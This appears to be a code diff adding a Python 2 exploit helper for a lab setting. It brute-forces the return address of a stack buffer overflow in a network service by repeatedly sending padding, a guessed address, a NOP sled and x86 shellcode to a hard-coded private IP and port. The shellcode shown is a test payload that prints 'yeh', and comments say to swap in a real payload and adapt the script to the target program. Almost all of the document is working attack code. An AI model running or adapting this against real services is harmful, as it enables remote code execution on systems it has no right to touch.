@@ -9,3 +9,71 @@
 # somewhere in the NOP slide
 #
 # By CLonsdale
+#
+# WARNING, since the test payload may be shorter than the actual payload
+# The address you get back may need to be subtracted to ensure you start
+# at the beginning of the payload
+
+import socket
+import time
+
+# Network Parameters
+####################################################
+IP = "172.16.59.128"
+PORT = 5004
+###################################################
+
+# Hack parameters
+####################################################
+PAYLOAD = b"\xba\x04\x00\x00\x00\x68\x79\x65\x68\x00\x89\xe1\xbb\x04\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80"
+BUF_SIZE = 512
+GARBAGE_SIZE = 48
+####################################################
+
+NOP = b"\x90"
+ADDRESS_LENGTH = 4
+SLED_SIZE = BUF_SIZE - len(PAYLOAD) - GARBAGE_SIZE - ADDRESS_LENGTH
+GARBAGE = "A" * GARBAGE_SIZE
+NOP_SLED = NOP * SLED_SIZE
+
+# Loop through addresses with a prefix, going from start to end
+# increasing by step each time
+#
+# prefix is ffff by default
+# start is 0 by default (decimal)
+# end is (16**4 - 1) by default
+# step is SLED_SIZE by default
+
+# Depending on your position in the stack, you might want to go from 0xffff down to 0x0000
+# instead of the current way which is 0x0000 to 0xffff
+# YOU WILL NEED TO MAKE STEP A NEGATIVE NUMBER IN THAT CASE
+#
+def bruteForceAddress(output_validation, prefix="ffff", start=0, end=(16**4 -1), step=SLED_SIZE, debug=False):
+    for addr in range(start, end, step):
+        # Cut and paste the address into little endian format
+        addr_hex = format(addr, '04x')
+        addr_hex = addr_hex[2:] + addr_hex[:2] + prefix
+        address = addr_hex.decode('hex')
+
+        exploit = GARBAGE + address + NOP_SLED + PAYLOAD
+
+        sock = socket.create_connection((IP, PORT))
+        # This will need to be changed depending on the program youre trying to hack
+        sock.recv(1024)
+        sock.sendall(exploit)
+        sock.recv(1024)
+        output = sock.recv(1024)
+
+        if debug: 
+            print (prefix + format(addr, '04x'))
+
+        if output.startswith(output_validation):
+            # This is in little endian form
+            return addr_hex
+
+        # Depending on the program, the time may need to be adjusted
+        time.sleep(2.25)
+
+if __name__ == "__main__":
+    # Takes 4 mins to run
+    print bruteForceAddress("yeh")
